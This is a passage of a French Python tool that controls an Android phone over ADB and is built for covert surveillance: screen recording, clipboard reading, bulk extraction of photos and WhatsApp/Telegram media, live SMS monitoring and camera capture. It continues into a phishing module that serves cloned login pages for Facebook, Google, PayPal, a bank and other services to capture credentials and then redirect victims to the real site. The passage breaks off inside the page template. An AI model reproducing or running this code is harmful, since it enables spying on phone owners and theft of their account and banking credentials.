        if local_file.exists():
            print_success(f"Photo: {local_file.name}")
            return str(local_file)
    
    print_warning("Photo peut-Ãªtre non capturÃ©e")
    return None

def record_video_screen(duration=30):
    """Enregistrer l'Ã©cran avec audio interne"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ¥ ENREGISTREMENT Ã‰CRAN + AUDIO{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    if duration > 180:
        duration = 180
        print_warning("DurÃ©e limitÃ©e Ã  180 secondes")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    remote_file = f"/sdcard/screenrec_{timestamp}.mp4"
    local_file = OUTPUT_BASE / "Recordings" / f"screenrec_{timestamp}.mp4"
    
    print_info(f"Enregistrement pendant {duration} secondes...")
    
    # Enregistrer avec audio
    adb_shell(f"screenrecord --time-limit {duration} --bit-rate 4000000 {remote_file}", timeout=duration+10)
    
    # TÃ©lÃ©charger
    adb_pull(remote_file, str(local_file))
    adb_shell(f"rm {remote_file}")
    
    if local_file.exists():
        size = local_file.stat().st_size / (1024*1024)
        print_success(f"VidÃ©o: {local_file.name} ({size:.1f} MB)")
        return str(local_file)
    
    print_error("Ã‰chec de l'enregistrement")
    return None

def get_clipboard_content():
    """Lire le presse-papiers de maniÃ¨re lisible"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“‹ PRESSE-PAPIERS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # MÃ©thode via broadcast
    result = adb_shell("am broadcast -a clipper.get 2>/dev/null")
    
    # MÃ©thode alternative via service
    if not result or "null" in result.lower():
        result = adb_shell("service call clipboard 2 s16 com.android.shell 2>/dev/null")
        # Parser le rÃ©sultat Parcel
        if "Parcel" in result:
            try:
                # Extraire le texte entre quotes
                import re
                matches = re.findall(r"'([^']*)'", result)
                if matches:
                    result = ''.join(matches)
            except:
                pass
    
    if result and len(result) > 10:
        print_data("Contenu", result[:500])
    else:
        print_warning("Presse-papiers vide ou inaccessible")
    
    return result

def type_text_fast(text):
    """Taper du texte rapidement sur l'Ã©cran"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}âŒ¨ï¸ SAISIE TEXTE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Ã‰chapper les caractÃ¨res spÃ©ciaux
    text = text.replace(" ", "%s")
    text = text.replace("'", "\\'")
    text = text.replace('"', '\\"')
    text = text.replace("&", "\\&")
    text = text.replace("<", "\\<")
    text = text.replace(">", "\\>")
    text = text.replace(";", "\\;")
    text = text.replace("(", "\\(")
    text = text.replace(")", "\\)")
    
    adb_shell(f'input text "{text}"')
    print_success(f"Texte tapÃ©: {text[:50]}...")
    return True

def open_settings_page(page=""):
    """Ouvrir une page de paramÃ¨tres spÃ©cifique"""
    settings_pages = {
        "wifi": "android.settings.WIFI_SETTINGS",
        "bluetooth": "android.settings.BLUETOOTH_SETTINGS",
        "display": "android.settings.DISPLAY_SETTINGS",
        "sound": "android.settings.SOUND_SETTINGS",
        "battery": "android.settings.BATTERY_SAVER_SETTINGS",
        "apps": "android.settings.APPLICATION_SETTINGS",
        "security": "android.settings.SECURITY_SETTINGS",
        "location": "android.settings.LOCATION_SOURCE_SETTINGS",
        "developer": "android.settings.APPLICATION_DEVELOPMENT_SETTINGS",
        "date": "android.settings.DATE_SETTINGS",
        "language": "android.settings.LOCALE_SETTINGS",
        "storage": "android.settings.INTERNAL_STORAGE_SETTINGS",
        "accessibility": "android.settings.ACCESSIBILITY_SETTINGS",
        "nfc": "android.settings.NFC_SETTINGS",
        "airplane": "android.settings.AIRPLANE_MODE_SETTINGS",
        "vpn": "android.settings.VPN_SETTINGS",
        "hotspot": "android.settings.TETHER_SETTINGS",
        "accounts": "android.settings.SYNC_SETTINGS",
        "backup": "android.settings.BACKUP_SETTINGS",
        "about": "android.settings.DEVICE_INFO_SETTINGS",
    }
    
    if page.lower() in settings_pages:
        action = settings_pages[page.lower()]
    else:
        action = "android.settings.SETTINGS"
    
    adb_shell(f"am start -a {action}")
    print_success(f"ParamÃ¨tres ouverts: {page if page else 'principal'}")

def get_storage_info():
    """Informations dÃ©taillÃ©es sur le stockage"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ’¾ STOCKAGE DÃ‰TAILLÃ‰{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Espace disque
    df = adb_shell("df -h")
    print(f"    {C.YELLOW}Espace disque:{C.END}\n")
    for line in df.split('\n')[:10]:
        if line.strip() and ('G' in line or 'M' in line):
            print(f"        {line[:70]}")
    
    # Taille des dossiers principaux
    print(f"\n    {C.YELLOW}Taille des dossiers:{C.END}\n")
    folders = ["/sdcard/DCIM", "/sdcard/Download", "/sdcard/WhatsApp", "/sdcard/Pictures"]
    for folder in folders:
        size = adb_shell(f"du -sh {folder} 2>/dev/null | cut -f1")
        if size and "No such" not in size:
            print(f"        ğŸ“ {folder}: {size}")
    
    return df

def get_network_info():
    """Informations rÃ©seau dÃ©taillÃ©es"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸŒ INFORMATIONS RÃ‰SEAU{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # IP
    ip = adb_shell("ip addr show wlan0 2>/dev/null | grep 'inet '")
    print_data("IP WiFi", ip.split()[1] if ip and 'inet' in ip else "Non connectÃ©")
    
    # Gateway
    gateway = adb_shell("ip route | grep default")
    print_data("Gateway", gateway.split()[2] if gateway else "N/A")
    
    # DNS
    dns = adb_shell("getprop net.dns1")
    print_data("DNS", dns)
    
    # MAC
    mac = adb_shell("cat /sys/class/net/wlan0/address 2>/dev/null")
    print_data("MAC", mac)
    
    # Connexions actives
    print(f"\n    {C.YELLOW}Connexions actives:{C.END}\n")
    netstat = adb_shell("netstat -an 2>/dev/null | grep ESTABLISHED | head -10")
    for line in netstat.split('\n')[:10]:
        if line.strip():
            print(f"        {line[:70]}")
    
    return ip

def watch_screen_continuous():
    """Surveillance continue avec scrcpy en mode record"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ‘ï¸ SURVEILLANCE CONTINUE{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    record_file = OUTPUT_BASE / "Recordings" / f"surveillance_{timestamp}.mp4"
    
    if os.path.exists(SCRCPY_PATH):
        print_info("Lancement surveillance avec enregistrement...")
        print_info(f"Fichier: {record_file}")
        print_warning("Appuyez sur Ctrl+C pour arrÃªter")
        
        cmd = f'"{SCRCPY_PATH}" -s {DEVICE} --record "{record_file}" --no-audio'
        subprocess.Popen(cmd, shell=True)
        
        print_success("Surveillance lancÃ©e!")
    else:
        print_error("Scrcpy non trouvÃ©")

def extract_all_media():
    """Extraire tous les mÃ©dias (photos, vidÃ©os, audio)"""
    print(f"\n{C.RED}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}ğŸ“¸ EXTRACTION TOUS MÃ‰DIAS{C.END}")
    print(f"{C.RED}{'â•'*70}{C.END}\n")
    
    total = 0
    
    # Photos
    print_info("Extraction photos...")
    adb_pull("/sdcard/DCIM", str(OUTPUT_BASE / "Photos" / "DCIM"))
    adb_pull("/sdcard/Pictures", str(OUTPUT_BASE / "Photos" / "Pictures"))
    
    # VidÃ©os
    print_info("Extraction vidÃ©os...")
    adb_pull("/sdcard/Movies", str(OUTPUT_BASE / "Videos" / "Movies"))
    
    # Audio
    print_info("Extraction audio...")
    adb_pull("/sdcard/Music", str(OUTPUT_BASE / "Audio"))
    adb_pull("/sdcard/Recordings", str(OUTPUT_BASE / "Audio" / "Recordings"))
    
    # WhatsApp
    print_info("Extraction WhatsApp...")
    adb_pull("/sdcard/WhatsApp/Media", str(OUTPUT_BASE / "WhatsApp" / "Media"))
    
    # Telegram
    print_info("Extraction Telegram...")
    adb_pull("/sdcard/Telegram", str(OUTPUT_BASE / "Telegram"))
    
    # Compter
    for folder in [OUTPUT_BASE / "Photos", OUTPUT_BASE / "Videos", OUTPUT_BASE / "Audio", OUTPUT_BASE / "WhatsApp"]:
        if folder.exists():
            total += sum(1 for f in folder.rglob("*") if f.is_file())
    
    print_success(f"Total: {total} fichiers extraits")
    return total

def monitor_sms_live(duration=60):
    """Surveiller les SMS en temps rÃ©el"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± SURVEILLANCE SMS EN DIRECT ({duration}s){C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_info("Surveillance des nouveaux SMS...")
    print_warning("Attendez qu'un SMS arrive...")
    
    # Obtenir le dernier SMS actuel
    last_sms = adb_shell('content query --uri content://sms/inbox --projection "_id" --sort "_id DESC LIMIT 1"')
    last_id = "0"
    if "id=" in last_sms:
        try:
            last_id = last_sms.split("_id=")[1].split(",")[0]
        except:
            pass
    
    start_time = time.time()
    new_sms_count = 0
    
    while time.time() - start_time < duration:
        current = adb_shell(f'content query --uri content://sms/inbox --projection "_id,address,body" --where "_id > {last_id}" --sort "_id DESC"')
        
        if "Row:" in current and current != last_sms:
            print(f"\n    {C.GREEN}ğŸ†• NOUVEAU SMS DÃ‰TECTÃ‰!{C.END}")
            for row in current.split("Row:")[:3]:
                if "address=" in row:
                    try:
                        addr = row.split("address=")[1].split(",")[0]
                        body = row.split("body=")[1].split(",")[0][:100]
                        print(f"        ğŸ“© De: {addr}")
                        print(f"        ğŸ“ Message: {body}...")
                    except:
                        pass
            
            # Mettre Ã  jour le dernier ID
            try:
                last_id = current.split("_id=")[1].split(",")[0]
            except:
                pass
            
            new_sms_count += 1
            last_sms = current
        
        time.sleep(2)
        print(".", end="", flush=True)
    
    print(f"\n\n    ğŸ“Š {new_sms_count} nouveau(x) SMS dÃ©tectÃ©(s)")
    return new_sms_count

def get_installed_apps_detailed():
    """Liste dÃ©taillÃ©e des applications avec tailles"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“± APPLICATIONS DÃ‰TAILLÃ‰ES{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Apps tierces
    apps = adb_shell("pm list packages -3 -f")
    app_list = []
    
    for line in apps.split('\n'):
        if 'package:' in line:
            try:
                path = line.split('package:')[1].split('=')[0]
                package = line.split('=')[-1]
                
                # Taille
                size = adb_shell(f"stat -c%s {path} 2>/dev/null")
                size_mb = int(size) / (1024*1024) if size.isdigit() else 0
                
                app_list.append({
                    "package": package.strip(),
                    "path": path,
                    "size_mb": round(size_mb, 2)
                })
                
                if len(app_list) <= 20:
                    print(f"        ğŸ“¦ {package.strip()[:40]:<40} {size_mb:.1f} MB")
            except:
                pass
    
    # Trier par taille
    app_list.sort(key=lambda x: x['size_mb'], reverse=True)
    
    # Sauvegarder
    with open(OUTPUT_BASE / "Apps" / "apps_detailed.json", "w", encoding="utf-8") as f:
        json.dump(app_list, f, indent=2, ensure_ascii=False)
    
    total_size = sum(a['size_mb'] for a in app_list)
    print(f"\n    ğŸ“Š Total: {len(app_list)} apps ({total_size:.1f} MB)")
    print_success("SauvegardÃ©: Apps/apps_detailed.json")
    
    return app_list


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 19: PROCESSUS ET MÃ‰MOIRE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_running_processes():
    """Lister les processus en cours"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}âš™ï¸ PROCESSUS EN COURS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    # Top processus
    ps = adb_shell("ps -A | head -50")
    
    print(f"    {C.YELLOW}Processus actifs:{C.END}\n")
    for line in ps.split('\n')[:20]:
        if line.strip():
            print(f"        {line[:75]}")
    
    # MÃ©moire
    print(f"\n    {C.YELLOW}Utilisation mÃ©moire:{C.END}\n")
    meminfo = adb_shell("cat /proc/meminfo | head -10")
    for line in meminfo.split('\n'):
        if line.strip():
            print(f"        {line}")
    
    # Sauvegarder
    with open(OUTPUT_BASE / "System" / "processes.txt", "w", encoding="utf-8") as f:
        f.write(f"=== PROCESSUS - {datetime.now()} ===\n\n")
        f.write(ps)
        f.write("\n\n=== MÃ‰MOIRE ===\n")
        f.write(meminfo)
    
    print_success("SauvegardÃ©: System/processes.txt")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 20: PERMISSIONS DES APPS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_app_permissions(package=None):
    """Voir les permissions d'une ou toutes les apps"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ”’ PERMISSIONS DES APPLICATIONS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    if package:
        # Permissions d'une app spÃ©cifique
        perms = adb_shell(f"dumpsys package {package} | grep -A 100 'granted=true'")
        print(f"    {C.YELLOW}Permissions de {package}:{C.END}\n")
        
        dangerous_perms = [
            "CAMERA", "MICROPHONE", "LOCATION", "CONTACTS", 
            "SMS", "PHONE", "STORAGE", "CALENDAR"
        ]
        
        for line in perms.split('\n'):
            if 'android.permission' in line:
                perm = line.strip()
                is_dangerous = any(d in perm.upper() for d in dangerous_perms)
                icon = "ğŸ”´" if is_dangerous else "ğŸŸ¢"
                print(f"        {icon} {perm[:60]}")
    else:
        # Apps avec permissions dangereuses
        print(f"    {C.YELLOW}Apps avec accÃ¨s CAMERA:{C.END}")
        camera = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'CAMERA.*granted=true' | grep 'Package'")
        print(camera[:500] if camera else "        Aucune")
        
        print(f"\n    {C.YELLOW}Apps avec accÃ¨s MICROPHONE:{C.END}")
        mic = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'RECORD_AUDIO.*granted=true' | grep 'Package'")
        print(mic[:500] if mic else "        Aucune")
        
        print(f"\n    {C.YELLOW}Apps avec accÃ¨s LOCALISATION:{C.END}")
        location = adb_shell("pm list packages -p | xargs -I {} dumpsys package {} | grep -B1 'FINE_LOCATION.*granted=true' | grep 'Package'")
        print(location[:500] if location else "        Aucune")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 21: CLIPBOARD (PRESSE-PAPIERS)
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def get_clipboard():
    """Lire le presse-papiers"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“‹ PRESSE-PAPIERS{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    clipboard = adb_shell("service call clipboard 2 s16 com.android.shell")
    
    print_data("Contenu", clipboard[:200] if clipboard else "Vide ou inaccessible")
    
    return clipboard

def set_clipboard(text):
    """DÃ©finir le presse-papiers"""
    adb_shell(f'am broadcast -a clipper.set -e text "{text}"')
    print_success(f"Presse-papiers dÃ©fini: {text[:50]}...")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 22: CAMÃ‰RA
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def take_photo(camera="back"):
    """Prendre une photo avec la camÃ©ra"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“· CAPTURE CAMÃ‰RA{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    print_info(f"Ouverture camÃ©ra {camera}...")
    adb_shell("am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(3)
    print_info("Capture en cours...")
    adb_shell("input keyevent KEYCODE_CAMERA")
    time.sleep(2)
    adb_shell("input keyevent KEYCODE_HOME")
    print_info("RÃ©cupÃ©ration de la photo...")
    last_photo = adb_shell("ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1")
    if last_photo and ".jpg" in last_photo:
        local_file = OUTPUT_BASE / "Photos" / f"camera_{timestamp}.jpg"
        adb_pull(last_photo.strip(), str(local_file))
        if local_file.exists():
            print_success(f"Photo sauvegardÃ©e : {local_file.name}")
            print_info(f"Chemin du fichier photo : {local_file}")
            return str(local_file)
    print_warning("Photo peut-Ãªtre non capturÃ©e - vÃ©rifiez manuellement")
    return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 23: INSTALLATION/DÃ‰SINSTALLATION D'APPS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def install_apk(apk_path):
    """Installer une APK"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ“¥ INSTALLATION APK{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    if not os.path.exists(apk_path):
        print_error(f"Fichier non trouvÃ©: {apk_path}")
        return False
    
    print_info(f"Installation de {os.path.basename(apk_path)}...")
    result = adb(f'install -r "{apk_path}"')
    
    if "Success" in result:
        print_success("Installation rÃ©ussie!")
        return True
    else:
        print_error(f"Ã‰chec: {result}")
        return False

def uninstall_app(package):
    """DÃ©sinstaller une application"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ—‘ï¸ DÃ‰SINSTALLATION{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    print_warning(f"DÃ©sinstallation de {package}...")
    result = adb(f'uninstall {package}')
    
    if "Success" in result:
        print_success("DÃ©sinstallation rÃ©ussie!")
        return True
    else:
        print_error(f"Ã‰chec: {result}")
        return False

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 24: BACKUP COMPLET
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def full_backup():
    """CrÃ©er un backup complet"""
    print(f"\n{C.CYAN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}ğŸ’¾ BACKUP COMPLET{C.END}")
    print(f"{C.CYAN}{'â•'*70}{C.END}\n")
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_file = OUTPUT_BASE / f"backup_{timestamp}.ab"
    
    print_warning("Un popup va apparaÃ®tre sur le tÃ©lÃ©phone")
    print_info("Appuyez sur 'SAUVEGARDER MES DONNÃ‰ES' sur le tÃ©lÃ©phone")
    
    result = adb(f'backup -apk -shared -all -f "{backup_file}"', timeout=300)
    
    if backup_file.exists():
        size = backup_file.stat().st_size / (1024*1024)
        print_success(f"Backup crÃ©Ã©: {backup_file.name} ({size:.1f} MB)")
        return str(backup_file)
    else:
        print_error("Backup Ã©chouÃ© ou annulÃ©")
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 26: PHISHING - FAUX SITES WEB ğŸ£
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

import threading
import socket
import webbrowser
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# Variable globale pour les donnÃ©es capturÃ©es
CAPTURED_DATA = []
PHISHING_SERVER = None
PHISHING_PORT = 8888

def get_local_ip():
    """Obtenir l'IP locale de la machine"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_phishing_page(template="facebook"):
    """GÃ©nÃ¨re une page de phishing selon le template - ULTRA RÃ‰ALISTE"""
    
    templates = {
        "facebook": {
            "title": "Facebook - Connectez-vous",
            "logo": "https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg",
            "color": "#1877f2",
            "fields": ["email", "password"],
            "button": "Se connecter",
            "redirect": "https://www.facebook.com",
            "subtitle": "Connectez-vous Ã  Facebook",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "CrÃ©er un compte"
        },
        "google": {
            "title": "Se connecter - Comptes Google",
            "logo": "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png",
            "color": "#1a73e8",
            "fields": ["email", "password"],
            "button": "Suivant",
            "redirect": "https://www.google.com",
            "subtitle": "Utiliser votre compte Google",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "CrÃ©er un compte"
        },
        "instagram": {
            "title": "Instagram",
            "logo": "https://i.imgur.com/zqpwkLQ.png",
            "color": "#0095f6",
            "fields": ["username", "password"],
            "button": "Se connecter",
            "redirect": "https://www.instagram.com",
            "subtitle": "",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "Inscrivez-vous"
        },
        "whatsapp": {
            "title": "WhatsApp Web - VÃ©rification",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg",
            "color": "#25d366",
            "fields": ["phone", "verification_code"],
            "button": "VÃ©rifier",
            "redirect": "https://web.whatsapp.com",
            "subtitle": "VÃ©rification de sÃ©curitÃ© requise",
            "forgot": "",
            "create": ""
        },
        "bank": {
            "title": "Espace Client - Banque SÃ©curisÃ©e",
            "logo": "",
            "color": "#003366",
            "fields": ["numero_compte", "mot_de_passe", "code_secret"],
            "button": "AccÃ©der Ã  mon compte",
            "redirect": "https://www.google.com/search?q=banque+en+ligne",
            "subtitle": "Connexion sÃ©curisÃ©e Ã  votre espace personnel",
            "forgot": "Identifiants oubliÃ©s ?",
            "create": ""
        },
        "netflix": {
            "title": "Netflix - Connexion",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg",
            "color": "#e50914",
            "fields": ["email", "password"],
            "button": "S'identifier",
            "redirect": "https://www.netflix.com",
            "subtitle": "",
            "forgot": "Besoin d'aide ?",
            "create": "Inscrivez-vous"
        },
        "paypal": {
            "title": "PayPal - Connexion sÃ©curisÃ©e",
            "logo": "https://www.paypalobjects.com/webstatic/icon/pp258.png",
            "color": "#0070ba",
            "fields": ["email", "password"],
            "button": "Connexion",
            "redirect": "https://www.paypal.com",
            "subtitle": "Payez en toute sÃ©curitÃ©",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "Ouvrir un compte"
        },
        "tiktok": {
            "title": "TikTok - Connexion",
            "logo": "https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0a6e.svg",
            "color": "#fe2c55",
            "fields": ["email_ou_telephone", "mot_de_passe"],
            "button": "Connexion",
            "redirect": "https://www.tiktok.com",
            "subtitle": "",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "S'inscrire"
        },
        "snapchat": {
            "title": "Snapchat - Login",
            "logo": "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png",
            "color": "#fffc00",
            "fields": ["username", "password"],
            "button": "Log In",
            "redirect": "https://www.snapchat.com",
            "subtitle": "",
            "forgot": "Forgot Password?",
            "create": "Sign Up"
        },
        "outlook": {
            "title": "Connexion - Microsoft",
            "logo": "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo.png",
            "color": "#0078d4",
            "fields": ["email", "password"],
            "button": "Se connecter",
            "redirect": "https://outlook.live.com",
            "subtitle": "",
            "forgot": "Impossible d'accÃ©der Ã  votre compte ?",
            "create": "CrÃ©er un compte"
        },
        "amazon": {
            "title": "Amazon - Connexion",
            "logo": "https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg",
            "color": "#ff9900",
            "fields": ["email_ou_telephone", "mot_de_passe"],
            "button": "Continuer",
            "redirect": "https://www.amazon.fr",
            "subtitle": "Se connecter",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": "CrÃ©er votre compte Amazon"
        },
        "custom": {
            "title": "Connexion SÃ©curisÃ©e",
            "logo": "",
            "color": "#333333",
            "fields": ["identifiant", "mot_de_passe"],
            "button": "Valider",
            "redirect": "https://www.google.com",
            "subtitle": "AccÃ¨s Ã  votre espace personnel",
            "forgot": "Mot de passe oubliÃ© ?",
            "create": ""
        }
    }
    
    t = templates.get(template, templates["custom"])
    
    fields_html = ""
    for field in t["fields"]:
        field_type = "password" if "password" in field.lower() or "secret" in field.lower() else "text"
        placeholder = field.replace("_", " ").title()
        fields_html += f'''
        <input type="{field_type}" name="{field}" placeholder="{placeholder}" required 
               style="width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; 
                      border-radius: 5px; font-size: 16px; box-sizing: border-box;">
        '''
    
    # Liens optionnels
    forgot_html = f'<a href="#" style="color: {t["color"]}; text-decoration: none; font-size: 14px;">{t.get("forgot", "")}</a>' if t.get("forgot") else ""
    create_html = f'<a href="#" style="color: {t["color"]}; text-decoration: none; font-size: 14px; font-weight: bold;">{t.get("create", "")}</a>' if t.get("create") else ""
    subtitle_html = f'<p style="color: #666; margin-bottom: 20px; font-size: 16px;">{t.get("subtitle", "")}</p>' if t.get("subtitle") else ""
    
    # Stocker l'URL de redirection dans un champ cachÃ©
    redirect_url = t.get("redirect", "https://www.google.com")
    
    html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{t["title"]}</title>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .container {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }}
        .logo {{
            max-width: 180px;
            height: auto;
            margin-bottom: 20px;
        }}
        h1 {{
            color: #1c1e21;
            margin-bottom: 10px;
            font-size: 24px;
            font-weight: normal;
        }}
        input {{
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
